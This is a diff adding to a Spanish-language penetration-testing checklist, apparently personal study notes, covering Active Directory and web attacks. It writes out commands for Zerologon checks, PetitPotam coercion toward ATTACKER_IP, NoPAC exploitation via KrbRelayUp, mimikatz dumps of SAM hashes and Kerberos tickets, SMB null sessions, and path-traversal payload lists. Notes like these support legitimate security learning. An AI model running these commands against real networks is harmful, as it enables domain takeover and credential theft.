@@ -1,7 +1,31 @@
 - [ ]  Known DC vulnerabilities:
-    - [ ]  Zerologon
+    - [ ]  Zerologon ([exploit](https://github.com/risksense/zerologon)) - Solo DC. 
+		```bash
+		#  Vulnerable? nmap
+		nmap --script smb-vuln-zerologon -p445 $target
+		# Vulnerable? zerologon_tester
+		python3 zerologon_tester.py DC_NAME DC_IP
+		```
     - [ ]  PetitPotam
-    - [ ]  NoPAC (once you have a user's creds)
+		```bash
+		# No creo que sea muy útil en la práctica, ya que es un ataque tipo MITM, $target puede ser cualqueir objetivo
+		python3 PetitPotam.py -u '' -p '' -d '' ATTACKER_IP TARGET_IP
+		# Es vulnerable si recibimos respuesta al ponernos en escucha
+		sudo responder -I tun0
+		```
+    - [ ]  NoPAC (once you have a user's creds) - Solo DC ([exploit]( https://github.com/Dec0ne/KrbRelayUp))
+		```bash
+		# Ataque lanzado por cualquier usuario con acceso al dominio
+		# Comprobar si es vulnerable
+		git clone https://github.com/Ridter/CheckNoPAC
+		python3 checknopac.py -u USER -p PASSWORD -d DOMAIN -dc-ip IP
+		# Explotación
+		git clone https://github.com/Dec0ne/KrbRelayUp
+		python3 KrbRelayUp.py -d domain.local -u lowprivuser -p Pass123! -dc-ip 10.10.10.10
+
+		
+		```
+
 - [ ]  Kerberoastable accounts
 - [ ]  AS-REP Roastable accounts
 - [ ]  Find computers where Domain Users can RDP
@@ -22,12 +46,18 @@
 	 Get-DomainComputer | select -ExpandProperty name > equipos.txt
 	foreach ($equipo in (Get-Content .\equipos.txt)) {$IP = Resolve-DnsName $equipo | select -ExpandProperty ipaddress; echo "$ip $equipo" } 
 	# Usuarios del dominio
-	Get-DomainUser | select -ExpandProperty name	
+	Get-DomainUser | select -ExpandProperty sAMAccountName	
+	# Recursos compartidos
+	foreach ($equipo in (Get-Content .\equipos.txt)) {net view \\$equipo}
 	```
 - [[Miscelaneo#ASREPRoasting| Asreproasting]]: Cuentas sin preautenticación kerberos. Podemos obtener el hash de usuarios asreproasteables e intentar crackearlos. 
-- [[Kerberoasting| Cuentas kerberoasteables]] : Cualquier usuario autenticado puede solicitar un TGS de una cuenta con SPN e intentar crackearlo con hashcat. Si se consigue acceso a la cuenta se usaría como una cuenta normal
+- [[Kerberoasting| Cuentas kerberoasteables]] : Cualquier usuario autenticado puede solicitar un TGS de una cuenta con SPN e intentar crackearlo con hashcat. Si se consigue 
+- Probar null session en smb
+	```
+	smbclient -N -U "" -L \\$target
+	```
 - Puertos internos expuestos que no se ven desde fuera (`netstat.exe -at`)
-- Escalar privilegios y tratar de encontrar más información (`whoami /priv`, `winpeas`, `findstr`...)
+- [[Privesc Windows|Escalar privilegios]] y tratar de encontrar más información (`whoami /priv`, `winpeas`, `findstr`...)
 - Recopilación información con mimikatz 
 	```powershell
 	# SAM ... token::elevate? (pth y crack)
@@ -41,8 +71,8 @@
 	# Extraer tickets (ptt)
 	.\mimikatz.exe privilege::debug sekurlsa::tickets /export exit
 	```
-- Con la información probar pth, ptt, opth, crackear
-- Con las credenciales obtenidas intentar conexión vía `rdp`, `winrm`, `impacket-wmiexec`, `impacket-psexec`
+- Con la información probar pth, ptt, opth, crackear, buscar contraseñas en texto plano
+- Con las credenciales obtenidas intentar conexión vía `rdp`, `winrm`, `impacket-wmiexec`, `impacket-psexec`. Probar también con `--local-auth`
 - Información útil con bloodhound
 
 ## Webpage
@@ -73,5 +103,7 @@
 - Intentar utilizar [credenciales por defecto](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)
 - Hacer [[Ffuf| fuzzing]] de directorios y vhosts si procede
 - Intentar en todos los campos que proceda inyectar comandos (sqli, xss,)
-- Intentar path traversal
+- Cambiar parámetros get (estar atento a cualquier cambio)
+- Intentar [path traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md). [Lista](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt)
 - Intentar LFI/RFI, especialmente en parámetros url
+
